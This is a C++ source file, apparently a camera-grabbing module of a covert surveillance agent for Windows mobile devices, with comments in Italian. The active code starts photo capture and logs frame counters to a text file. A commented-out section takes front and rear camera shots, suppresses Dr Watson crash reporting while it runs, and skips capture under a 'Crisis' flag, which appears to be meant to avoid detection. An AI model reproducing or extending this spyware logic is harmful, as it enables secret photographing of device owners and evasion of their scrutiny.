#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "Camera.h"
#include "Status.h"

#include "wtypes.h"

/*****
#include "NativePhotoCaptureInterface.h"
using namespace NativePhotoCaptureInterface::Native;
*****/

#include "NativeCameraCaptureInterface.h"
using namespace NativeCameraCaptureInterface::Native;

extern "C" int conta;
extern "C"  int contaCameraCapturePreviewSink;
extern "C"  int contaCameraCaptureSampleSink;
int conta=0;
int contaCameraCapturePreviewSink=0;
int contaCameraCaptureSampleSink=0;

#include <time.h>
#include <iostream>
#include <fstream>
#include <windows.h>

#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21
static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

using namespace std;

NativeCapture^ photoCapture;

DWORD WINAPI CameraModule(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	HANDLE moduleHandle;

	INT  iResult = 0;
	BSTR bstr1, bstr2 = NULL;
	DWORD dwModeRear = MODE_STILL, dwModeFront = MODE_CAPTURE;
	Device* devobj = Device::self();
	Status* statusObj = Status::self();
	DeviceCam devCam;

	me->setStatus(MODULE_RUNNING);
	moduleHandle = me->getEvent();

	
	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module is Alive\n", 5, FALSE);

	/*****
	NativeCapture^ photoCapture = ref new NativeCapture();
	photoCapture=nullptr;
	*****/
		
		wchar_t msgW[128];
		char msgA[128];
		swprintf_s(msgW,L"conta=%i\ncontaCameraCapturePreviewSink=%i\ncontaCameraCaptureSampleSink=%i\n",conta,contaCameraCapturePreviewSink,contaCameraCaptureSampleSink );
		wcstombs(msgA, msgW, wcslen(msgW)+1);

		fstream filestr;
		char buff[DTTMSZ];
		filestr.open ("fotogrammi.txt", fstream::out|fstream::app);
		filestr << getDtTm (buff) << std::endl;
		filestr << msgA << std::endl;
		filestr << std::endl;
		filestr.close();


	conta++;
	if(conta==1)
	{
		photoCapture = ref new NativeCapture();
		photoCapture->StartCapture();
	//NativeCapture^ photoCapture = ref new NativeCapture();
	//photoCapture=nullptr;
	}
	else
	{
			photoCapture->StartCapture();
			
	}


	me->setStatus(MODULE_STOPPED);
	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module clean stop\n", 5, FALSE);

/***
	HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);

	// CoUninitialize va chiamata se la funzione torna S_OK o S_FALSE
	if (hr == S_FALSE) {
		CoUninitialize();
		DBG_TRACE(L"Debug - CameraGrabber.cpp - CameraAgent CoUninitialize S_FALSE [0]\n", 5, FALSE);
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	if (FAILED(hr)) {
		DBG_TRACE(L"Debug - CameraGrabber.cpp - CameraAgent CoUninitialize FAILED [1]\n", 5, FALSE);
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	devCam.FindCamera(L"CAM*");

	devobj->DisableDrWatson();

	// Se la camera e' presente proviamo un primo scatto nella modalita' di default.
	if (devCam.IsRearCamPresent()) {
		// Set registry power status during Suspend and resume
		devCam.SetRegPowerStatus(L"CAM1:");
		devCam.SetCam1PowerState();

		bstr1 = SysAllocString(L"CAM1:");

		iResult = CamGrabFrame(bstr1, dwModeRear);
		DBG_TRACE_INT(L"Debug - CameraGrabber.cpp - First CamGrabFrame rear return: ", 5, FALSE, iResult);

		switch (iResult) {
			case OUT_ERROR_FILTERAUTOCONNECT:
				dwModeRear = MODE_CAPTURE;
				break;

			case OUT_ERROR_LOADCAMDRIVER:  // NB: prvare a mettere una AgentSleep invece di disabilitare la cam
				devCam.DisableRearCam();
				break;

			case OUT_ERROR_EXCEPTION:
				devCam.DisableRearCam();
				break;

			default: 
				break;
		}	

		devCam.ReleaseCam1PowerState();
	}

	// Se la camera e' presente proviamo un primo scatto nella modalita' di default.
	if (devCam.IsFrontCamPresent()) {
		// Set registry power status during Suspend and resume
		devCam.SetRegPowerStatus(L"CAM2:");
		devCam.SetCam2PowerState();

		bstr2 = SysAllocString(L"CAM2:");

		iResult = CamGrabFrame(bstr2, dwModeFront);
		DBG_TRACE_INT(L"Debug - CameraGrabber.cpp - First CamGrabFrame front return: ", 5, FALSE, iResult);

		switch (iResult) {
			case OUT_ERROR_FILTERAUTOCONNECT:
				dwModeRear = MODE_CAPTURE;
				break;

			case OUT_ERROR_LOADCAMDRIVER:   // NB: provare a mettere una AgentSleep invece di disabilitare la cam
				devCam.DisableFrontCam();
				break;

			case OUT_ERROR_EXCEPTION:
				devCam.DisableFrontCam();
				break;

			default: 
				break;
		}	

		devCam.ReleaseCam2PowerState();
	}

	if ((statusObj->Crisis() & CRISIS_CAMERA) != CRISIS_CAMERA) {
		if (devCam.IsRearCamPresent()) {
			devCam.SetCam1PowerState();
			iResult = CamGrabFrame(bstr1, dwModeRear);

			if (iResult == OUT_ERROR_LOADCAMDRIVER)
				devCam.DisableRearCam();

			DBG_TRACE_INT(L"Debug - CameraGrabber.cpp - CamGrabFrame rear return: ", 5, FALSE, iResult);
			devCam.ReleaseCam1PowerState();
		}

		if (devCam.IsFrontCamPresent()) {
			devCam.SetCam2PowerState();
			iResult = CamGrabFrame(bstr2, dwModeFront);

			if (iResult == OUT_ERROR_LOADCAMDRIVER)
				devCam.DisableFrontCam();

			DBG_TRACE_INT(L"Debug - CameraGrabber.cpp - CamGrabFrame front return: ", 5, FALSE, iResult);
			devCam.ReleaseCam2PowerState();
		}
	}

	if (bstr1 != NULL)
		SysFreeString(bstr1);

	if (bstr2 != NULL)
		SysFreeString(bstr2);

	devobj->EnableDrWatson();
	CoUninitialize();
	me->setStatus(MODULE_STOPPED);
	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module clean stop\n", 5, FALSE);
	***/
	return 0;
}